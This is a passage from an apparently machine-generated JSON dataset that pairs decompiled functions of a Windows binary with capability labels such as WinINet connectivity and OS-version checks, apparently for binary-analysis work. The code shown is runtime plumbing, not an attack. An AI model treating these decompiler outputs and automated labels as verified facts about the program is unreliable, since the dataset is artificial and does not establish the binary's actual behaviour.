        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00465524(uint param_1, uint8_t param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.00465524::var_1h + 1;\n    var_18h = 0;\n    uStack52 = 0x46564a;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = param_2;\n    fcn.004047b0();\n    iVar3 = fcn.00404bcc();\n    if (iVar3 == 0) {\n        fcn.0040461c();\n        if (var_1h == 1) {\n            fcn.004048d4();\n        }\n    }\n    else {\n        var_ch = 1;\n        var_10h = 0;\n        iVar3 = 1;\n        bVar2 = false;\n        var_14h = fcn.00404888();\n        if (0 < var_14h) {\n            do {\n                cVar1 = *(in_EAX + -1 + iVar3);\n                if ((cVar1 == '\\\"') || (cVar1 == '\\'')) {\n                    bVar2 = bVar2 ^ 1;\n                }\n                else if ((*(in_EAX + -1 + iVar3) == *0x484028) && (!bVar2)) {\n                    if (var_1h == var_10h) break;\n                    if (var_10h == 0) {\n                        puStack56 = &fcn.00465524::var_18h;\n                        fcn.00404ae8();\n                    }\n                    var_ch = iVar3 + 1;\n                    var_10h = var_10h + 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 <= var_14h);\n        }\n        if (var_1h == var_10h) {\n            puStack56 = var_8h;\n            fcn.00404ae8();\n        }\n        else {\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = puStack56;\n    puStack48 = 0x465651;\n    uStack52 = 0x465649;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 640
    },
    "004659a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004659a8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack56 = 0x4659c5;\n        in_EAX = fcn.00403b58();\n        in_DL = extraout_DL;\n    }\n    uStack60 = 0x465a4f;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &fcn.004659a8::var_1h + 1;\n    var_1h._0_1_ = in_DL;\n    fcn.00404660();\n    fcn.0040c094();\n    arg_8h_00 = 0;\n    fcn.0040675c();\n    fcn.004099ac(arg_8h_00);\n    fcn.0040ca68(arg_8h);\n    *(in_EAX + 0xc) = arg_ch;\n    *in_FS_OFFSET = arg_8h;\n    uStack64 = 0x465a56;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 366
    },
    "00465cb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465cb4(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint *extraout_var;\n    uint *puVar3;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    uint lpBuffer;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint nSize;\n    \n    puStack92 = 0x465cd9;\n    fcn.00404f64();\n    uStack96 = 0x465df8;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    if (*0x48402c == NULL) {\n        puStack92 = &stack0xfffffffc;\n        fcn.0040c998();\n        fcn.00403fc0();\n    }\n    fcn.004031a8();\n    var_1ch = fcn.00404e30();\n    var_30h = *0x465e08;\n    uStack48 = *0x465e0c;\n    uStack44 = *0x465e10;\n    uStack40 = *0x465e14;\n    var_10h = &fcn.00465cb4::var_30h;\n    fcn.00406298();\n    var_8h = 0;\n    puVar3 = extraout_var;\n    iVar1 = fcn.00404e40();\n    if (iVar1 < 1) {\n        uVar2 = 0x15;\n    }\n    else {\n        nSize = 0x10;\n        puVar3 = &fcn.00465cb4::lpBuffer;\n        iVar1 = sub.kernel32.dll_GetComputerNameA(puVar3, &fcn.00465cb4::nSize);\n        if (iVar1 != 0) {\n            fcn.00404850();\n            fcn.00404838(0);\n            iVar1 = fcn.00408ab8();\n            if (iVar1 == 0) {\n                uVar2 = 0x15;\n                goto code_r0x00465da4;\n            }\n        }\n        uVar2 = 0x10;\n    }\ncode_r0x00465da4:\n    (**0x48402c)(param_2, 0, uVar2, &fcn.00465cb4::var_20h, 1, &fcn.00465cb4::var_10h, puVar3);\n    fcn.00465b2c();\n    fcn.00465b2c();\n    fcn.004062b0();\n    *in_FS_OFFSET = param_2;\n    fcn.004045ec(0x465dff);\n    fcn.00405034();\n    return;\n}\n",
        "token_count": 689
    },
    "00465ec4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465ec4(int32_t *param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x465f56;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*param_1 != 0) {\n        fcn.00406298();\n        (***in_EAX)();\n        cVar1 = fcn.0041966c();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00406298();\n            (**(_pe_dos_header + 0x10))(0, param_2, uVar2);\n            cVar1 = fcn.0041966c();\n            if (cVar1 != '\\0') {\n                (**(_pe_dos_header + 0x18))(0, *param_1);\n                cVar1 = fcn.0041966c();\n                if (cVar1 != '\\0') {\n                    *param_1 = 0;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x465f5d;\n    uStack32 = 0x465f4d;\n    fcn.00406298();\n    uStack32 = 0x465f55;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 368
    },
    "00466178": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466178(int32_t arg_8h, int16_t **arg_ch)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    char *in_EDX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t **in_FS_OFFSET;\n    uint uVar8;\n    int32_t *piStack1660;\n    uint uStack1656;\n    uchar *puStack1652;\n    int32_t *piStack1648;\n    uint uStack1644;\n    uchar *puStack1640;\n    uint32_t var_654h;\n    uint bstrString;\n    int32_t aiStack596 [127];\n    uint var_54h;\n    uint *var_34h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int16_t **var_24h;\n    int16_t **var_20h;\n    int16_t **var_1ch;\n    int16_t **var_18h;\n    int16_t **var_14h;\n    int32_t var_10h;\n    int16_t *var_ch;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    puStack1652 = &stack0xfffffffc;\n    puStack1640 = 0x46619a;\n    var_4h = in_EAX;\n    fcn.00404f64();\n    uStack1644 = 0x4664ba;\n    piStack1648 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff990;\n    var_10h = 0;\n    uStack1656 = 0x466497;\n    piStack1660 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff984;\n    var_2ch = in_EDX[1];\n    puVar1 = &stack0xfffffffc;\n    puStack1640 = &stack0xfffffffc;\n    if (0x40 < var_2ch) {\n        puStack1640 = &stack0xfffffffc;\n        fcn.0040c998();\n        fcn.00403fc0();\n        puVar1 = puStack1652;\n    }\n    puStack1652 = puVar1;\n    if (var_2ch != 0) {\n        var_14h = arg_ch;\n        var_18h = &fcn.00466178::var_654h + var_2ch * 4;\n        uVar6 = 0;\n        do {\n            var_18h = var_18h + -4;\n            var_ch = in_EDX[uVar6 + 3] & 0x7f;\n            uVar2 = in_EDX[uVar6 + 3] & 0x80;\n            if (var_ch == 0xa) {\n                *var_18h = 0xa;\n                var_18h[2] = 0x80020004;\n            }\n            else {\n                if (var_ch == 0x48) {\n                    var_20h = &fcn.00466178::bstrString + var_10h * 2;\n                    if (uVar2 == 0) {\n                        piVar4 = fcn.004053f4();\n                        *var_20h = piVar4;\n                        var_20h[1] = NULL;\n                        *var_18h = 0x8;\n                        var_18h[2] = *var_20h;\n                    }\n                    else {\n                        piVar4 = fcn.004053f4();\n                        *var_20h = piVar4;\n                        var_20h[1] = *var_14h;\n                        *var_18h = 0x4008;\n                        var_18h[2] = var_20h;\n                    }\n                    var_10h = var_10h + 1;\n                }\n                else if (uVar2 == 0) {\n                    if (var_ch == 0xc) {\n                        if (*var_14h == 0x100) {\n                            var_24h = &fcn.00466178::bstrString + var_10h * 2;\n                            piVar4 = fcn.004053f4();\n                            *var_24h = piVar4;\n                            var_24h[1] = NULL;\n                            *var_18h = 0x8;\n                            var_18h[2] = *var_24h;\n                            var_10h = var_10h + 1;\n                        }\n                        else {\n                            var_1ch = var_14h;\n                            *var_18h = *var_14h;\n                            var_18h[1] = var_1ch[1];\n                            var_18h[2] = var_1ch[2];\n                            var_18h[3] = var_1ch[3];\n                            var_14h = var_14h + 3;\n                        }\n                    }\n                    else {\n                        *var_18h = var_ch;\n                        var_18h[2] = *var_14h;\n                        if ((4 < var_ch) && (var_ch < 8)) {\n                            var_14h = var_14h + 1;\n                            var_18h[3] = *var_14h;\n                        }\n                    }\n                }\n                else {\n                    if ((var_ch == 0xc) && (**var_14h == 0x100)) {\n                        fcn.00410d48();\n                    }\n                    *var_18h = var_ch | 0x4000;\n                    var_18h[2] = *var_14h;\n                }\n                var_14h = var_14h + 1;\n            }\n            uVar6 = uVar6 + 1;\n        } while (var_2ch != uVar6);\n    }\n    var_34h = &fcn.00466178::var_654h;\n    var_30h = var_8h + 1;\n    var_28h = in_EDX[2];\n    uVar8 = *var_8h;\n    cVar3 = *in_EDX;\n    if (cVar3 == '\\x04') {\n        if ((var_654h & 0xfff) == 9) {\n            cVar3 = '\\b';\n        }\n        *var_8h = 0xfffffffd;\n        var_30h = var_8h;\n        var_28h = var_28h + 1;\n    }\n    else if (((cVar3 == '\\x01') && (var_2ch == 0)) && (arg_8h != 0)) {\n        cVar3 = '\\x03';\n    }\n    iVar5 = (**(*var_4h + 0x18))\n                      (var_4h, uVar8, *0x484328, 0, cVar3, &fcn.00466178::var_34h, arg_8h, &fcn.00466178::var_54h, 0);\n    iVar7 = var_10h;\n    if (iVar5 != 0) {\n        fcn.00466770();\n        iVar7 = var_10h;\n    }\n    while (iVar7 != 0) {\n        iVar7 = iVar7 + -1;\n        if (*(&stack0xfffffdac + iVar7 * 8) != 0) {\n            fcn.004053d0();\n        }\n    }\n    *in_FS_OFFSET = var_4h;\n    iVar7 = var_10h;\n    while (iVar7 != 0) {\n        iVar7 = iVar7 + -1;\n        sub.oleaut32.dll_SysFreeString_1(uVar8, (&fcn.00466178::bstrString)[iVar7 * 2]);\n    }\n    return;\n}\n",
        "token_count": 1750
    },
    "0046669c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046669c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uchar auStack76 [4];\n    int32_t iStack72;\n    int32_t iStack64;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x466761;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == -0x7ffdfff7) {\n        arg_14h = *(in_EDX + 0x1c);\n        puStack32 = &stack0xfffffffc;\n        fcn.00404850();\n        arg_10h = 0;\n        fcn.00404850();\n        arg_ch = 0;\n        arg_8h_00 = *(in_EDX + 0x10);\n        fcn.00404850();\n        iStack64 = fcn.00465a78(arg_8h_00, arg_ch, arg_10h, arg_14h);\n        if (arg_8h != '\\0') {\n            fcn.0040516c();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack64 = fcn.004659a8(0, in_EAX);\n    }\n    if (in_ECX != 0) {\n        iStack72 = iStack64;\n        if (iStack64 == 0) {\n            iStack72 = fcn.004045bc();\n        }\n    // WARNING: Could not recover jumptable at 0x00403fe1. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x485014)(0xeedfade, 1, 7, auStack76);\n        return;\n    }\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_10h;\n    uStack40 = 0x466768;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 531
    },
    "004669c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004669c4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x466a3a;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x485bec = *0x485bec + 1;\n    if (*0x485bec == 0) {\n        *0x485bf0 = 1;\n        fcn.00403820();\n        **0x484710 = 0;\n        **0x484348 = 0;\n        **0x4846a0 = 0;\n        if (*0x485bfc != '\\0') {\n            sub.ole32.dll_CoUninitialize();\n        }\n        fcn.00405080();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 213
    },
    "0046bba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bba0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x46bc2f;\n    iStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 == 0) || (*(param_2 + 8) == 0)) {\n        fcn.0040c8dc();\n        arg_8h = 0x46bc19;\n        fcn.00403fc0();\n    }\n    else {\n        arg_8h = &fcn.0046bba0::var_4h;\n        puStack36 = &stack0xfffffffc;\n        fcn.00409998(arg_8h);\n        fcn.0040c8dc();\n        fcn.00403fc0();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack40 = 0x46bc36;\n    iStack44 = 0x46bc2e;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 327
    },
    "0046bd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046bd70(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 8) != '\\0') {\n        uStack28 = 0x46bdb8;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(**(in_EAX + 4) + 0x16c))();\n        fcn.004749a0();\n        *in_FS_OFFSET = uStack32;\n    }\n    *(in_EAX + 8) = 0;\n    puStack24 = 0x46bdff;\n    fcn.0047627c();\n    return;\n}\n",
        "token_count": 193
    },
    "0046bf4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bf4c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack552;\n    uint uStack548;\n    uchar *puStack544;\n    uint var_20ch;\n    uint var_208h;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack544 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack548 = 0x46c01b;\n    uStack552 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd8;\n    if ((param_2[3] == 0) && (*(in_EAX + 0x1c) != 0)) {\n        fcn.00403770(&fcn.0046bf4c::var_108h, *(*(in_EAX + 0x1c) + 8));\n        fcn.00402cd0();\n        fcn.0040482c();\n        fcn.00408c28(var_8h);\n        fcn.00404948(0);\n        (**(*param_2 + 0x18))();\n    }\n    *in_FS_OFFSET = uStack552;\n    puStack544 = 0x46c022;\n    uStack548 = 0x46c00a;\n    fcn.004045c8();\n    uStack548 = 0x46c012;\n    fcn.004045c8();\n    uStack548 = 0x46c01a;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 376
    },
    "0046c048": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046c048(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        *(in_EAX + 0x20) = 0;\n        (**(**(in_EAX + 0x1c) + 0xb0))();\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0046c064": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c064(code *arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t *var_4h;\n    \n    if (*(in_EAX + 8) == '\\0') {\n        in_EAX[0xc] = in_EAX[0xc] + 1;\n        puStack12 = 0x46c082;\n        var_4h = in_EAX;\n        (**(*in_EAX + 0x20))();\n        uStack16 = 0x46c0b2;\n        uStack20 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffec;\n        puStack12 = &stack0xfffffffc;\n        (*arg_8h)();\n        *in_FS_OFFSET = uStack20;\n        puStack12 = 0x46c0b9;\n        uStack16 = 0x46c0ab;\n        (**(*var_4h + 0x24))();\n        var_4h[0xc] = var_4h[0xc] + -1;\n        return;\n    }\n    return;\n}\n",
        "token_count": 275
    },
    "0046c238": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046c238(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.0046c2e0();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x1c) == 0)) {\n        uVar2 = fcn.0041d234();\n        return uVar2;\n    }\n    return *(in_EAX + 0x1c);\n}\n",
        "token_count": 110
    },
    "0046c2a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046c2a8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.0046c750();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 90
    },
    "0046c434": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c434(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY64;\n    uint uStackY60;\n    uchar *puStackY56;\n    uint arg_8h_00;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = 0x46c451;\n    fcn.00404a78();\n    uStack44 = 0x46c609;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = 0x46c466;\n    puStack40 = &stack0xfffffffc;\n    iVar2 = fcn.0046c194();\n    if (iVar2 == 0) {\n        arg_8h_00 = 0;\n        puStackY56 = 0x46c47b;\n        fcn.0040675c();\n        puStackY56 = 0x46c494;\n        fcn.0046bc4c(arg_8h_00);\n    }\n    puStackY56 = 0x46c49e;\n    piVar3 = (**(iVar2 + 0x2c))();\n    uStackY60 = 0x46c5d4;\n    uStackY64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStackY56 = &stack0xfffffffc;\n    fcn.0046c238();\n    (**(*piVar3 + 0xc4))();\n    if (arg_8h == 0) {\n        fcn.0046e8dc();\n    }\n    else {\n        fcn.0046e8dc();\n    }\n    *(piVar3 + 0x45) = (*(in_EAX + 0x22) & 4) != 0;\n    fcn.0046eab0();\n    (**(*piVar3 + 0xdc))();\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.004039b8();\n        if (cVar1 != '\\0') {\n            piVar3[0x3d] = *(in_EAX + 0x14);\n        }\n    }\n    else {\n        piVar3[0x40] = *(in_EAX + 0x14);\n    }\n    if (in_ECX == 0) {\n        (**(*piVar3 + 0xb8))();\n    }\n    else {\n        (**(*piVar3 + 0xc0))();\n    }\n    if (((*(in_EAX + 0x22) & 0x20) != 0) || (*(in_EAX + 0x21) == '\\x17')) {\n        cVar1 = fcn.004039b8();\n        if (cVar1 != '\\0') {\n            *(piVar3 + 0x38) = 1;\n        }\n    }\n    if (*(in_EAX + 0x20) != '\\0') {\n        (**(*piVar3 + 0xbc))();\n    }\n    if ((*(in_EAX + 0x22) & 0x10) != 0) {\n        cVar1 = fcn.004039b8();\n        if (cVar1 != '\\0') {\n            fcn.00473430();\n        }\n    }\n    *in_FS_OFFSET = uStackY64;\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x46c610;\n    uStack48 = 0x46c600;\n    fcn.004045c8();\n    uStack48 = 0x46c608;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 911
    },
    "0046c61c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c61c(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_4h = fcn.0046c434(arg_ch);\n    if ((arg_8h != '\\0') && (cVar1 = fcn.0046c2e0(),  cVar1 != '\\0')) {\n        if (*(in_EAX + 0x21) == '\\x1b') {\n            if (*(*(*(in_EAX + 4) + 0x1c) + 0xaa) == '\\0') {\n                iVar2 = fcn.0046c238();\n            }\n            else {\n                iVar2 = 1;\n            }\n            if (-1 < iVar2 + -1) {\n                do {\n                    fcn.00409998(&var_8h);\n                    uVar3 = var_8h;\n                    arg_ch = 1;\n                    fcn.0046c2a8();\n                    fcn.0046c8dc();\n                    fcn.0046c61c(arg_ch, uVar3);\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n        }\n        else {\n            fcn.0046c2a8();\n            iVar2 = fcn.0041d234();\n            if (-1 < iVar2 + -1) {\n                do {\n                    uVar3 = 0;\n                    arg_ch = 1;\n                    fcn.0046c2a8();\n                    fcn.0046c8dc();\n                    fcn.0046c61c(arg_ch, uVar3);\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n        }\n    }\n    *in_FS_OFFSET = arg_ch;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 492
    },
    "0046c750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0046c750(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        fcn.004039dc();\n    }\n    else {\n        *(in_EAX + 0x38) = param_1;\n    }\n    uVar2 = *0x466ee8;\n    fcn.0046bef8(*0x466ee8, param_1);\n    if (*(in_EAX + 0x38) != 0) {\n        *(in_EAX + 0x2c) = in_EAX;\n        *(in_EAX + 0x28) = 0x46c90c;\n    }\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 314
    },
    "0046c7d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
